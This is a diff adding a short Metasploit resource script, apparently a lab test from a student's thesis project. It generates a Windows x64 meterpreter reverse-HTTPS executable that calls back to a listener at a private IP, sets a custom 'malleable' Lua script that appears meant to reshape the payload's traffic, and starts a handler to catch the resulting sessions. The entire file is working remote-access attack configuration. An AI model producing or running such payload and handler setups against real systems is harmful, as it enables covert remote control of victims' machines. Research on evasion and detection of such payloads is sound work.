@@ -1,0 +1,31 @@
+# test timo
+setg LogLevel 3
+
+## PAYLOAD
+use payload/windows/x64/meterpreter_reverse_https
+
+set LHOST 192.168.42.131
+set LPORT 5555
+#set LPORT 80
+
+set OverrideRequestHost true
+
+set OverrideScheme httpm
+
+set malleablescriptpath /home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/meterpreter_doNothing.lua
+
+generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.exe
+
+## HANDLER
+use multi/handler
+set payload windows/x64/meterpreter_reverse_http
+
+set LHOST 192.168.42.131
+set LPORT 5555
+
+
+set ExitOnSession false
+
+run -j
+
+jobs -v
